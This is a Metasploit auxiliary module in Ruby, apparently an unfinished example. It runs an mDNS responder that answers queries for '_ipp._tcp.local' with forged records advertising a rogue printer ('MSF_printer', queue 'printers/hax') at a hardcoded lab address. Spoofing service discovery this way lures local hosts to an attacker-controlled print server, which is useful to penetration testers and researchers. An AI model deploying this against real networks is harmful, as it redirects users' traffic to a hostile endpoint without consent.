##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DNS::Server

  MULTICAST_ADDR = '224.0.0.251'

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Native mDNS Server (Example)',
      'Description'    => %q{

      },
      'Author'         => [
        'Spencer McIntyre',
        'RageLtMan <rageltman[at]sempervictus>'
      ],
      'License'        => MSF_LICENSE,
      'References'     => [],
      'Actions'   =>
        [
          [ 'Service', 'Description' => 'Run mDNS service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    ))
  end

  def start_service
    super

    membership = IPAddr.new(MULTICAST_ADDR).hton + IPAddr.new(bindhost).hton
    self.service.udp_sock.setsockopt(Socket::IPPROTO_IP, Socket::IP_ADD_MEMBERSHIP, membership)
  end

  #
  # Wrapper for service execution and cleanup
  #
  def run
    begin
      start_service
      service.wait
    rescue Rex::BindFailed => e
      print_error "Failed to bind to port #{datastore['RPORT']}: #{e.message}"
    end
  end

  #
  # Creates Proc to handle incoming requests
  #
  def on_dispatch_request(cli,data)
    return if data.strip.empty?

    req = Packet.encode_drb(data)

    return unless req.answer.empty?

    peer = "#{cli.peerhost}:#{cli.peerport}"
    asked = req.question.map(&:qname).map(&:to_s).join(', ')
    vprint_status("Received request for #{asked} from #{peer}")

    printer_name = 'MSF_printer'

    req.question.each do |question|
      case question.qname.to_s
      when '_ipp._tcp.local'
        req.add_answer(Dnsruby::RR.create(
          name: '_ipp._tcp.local.',
          type: 'PTR',
          ttl: 4500,
          domainname: "#{printer_name}._ipp._tcp.local"
        ))
        req.add_answer(Dnsruby::RR.create(
          name: "#{printer_name}._ipp._tcp.local",
          type: 'SRV',
          #klass: 0x8001,
          ttl: 120,
          target: "#{printer_name}.local",
          priority: 0,
          weight: 0,
          port: 8631
        ))
        req.add_answer(Dnsruby::RR.create(
          name: "#{printer_name}._ipp._tcp.local",
          type: 'TXT',
          ttl: 4500
        ).tap { |rr| rr.strings = [
            'txtvers=1',
            'qtotal=1',
            'rp=printers/hax',
            'ty=MSF Printer',
            'pdl=application/postscript,application/pdf',
            'adminurl=http://192.168.159.128:8631',
            'UUID=ff3332a5-a6e3-4ac7-9679-16c322f153a4',
            'printer-type=0x800683'
          ]

        })
        req.add_answer(Dnsruby::RR.create(
          name: "#{printer_name}._ipp._tcp.local",
          type: 'NSEC',
          ttl: 120,
          next_domain: "#{printer_name}._ipp._tcp.local",
          types: [Dnsruby::Types.AAAA]
        ))
        req.add_answer(Dnsruby::RR.create(
          name: "#{printer_name}.local",
          type: 'A',
          ttl: 120,
          address: '192.168.159.128'
        ))
      end
    end

    req.question.clear
    req.update_counts

    return if req.answer.empty?

    req.header.aa = true
    response_data = Packet.generate_response(req).encode
    #service.send_response(cli, response_data)
    #cli.write()
    cli.srvsock.sendto(response_data, MULTICAST_ADDR, 5353)
    #sock = Rex::Socket::Udp.create('PeerHost' => '224.0.0.251', 'PeerPort' => 5353, 'LocalHost' => '192.168.159.128', 'LocalPort' => 5353)
    #sock.write(response_data)
  end

  #
  # Creates Proc to handle outbound responses
  #
  # def on_send_response(cli, data)
  #   res = Packet.encode_drb(data)
  #   peer = "#{cli.peerhost}:#{cli.peerport}"
  #   asked = res.question.map(&:qname).map(&:to_s).join(', ')
  #   vprint_status("Sending response for #{asked} to #{peer}")
  #
  #   sock = Rex::Socket::Udp.create('PeerHost' => '224.0.0.251', 'PeerPort' => 5353, 'LocalHost' => '192.168.159.128')
  #   sock.write(data)
  # end
end
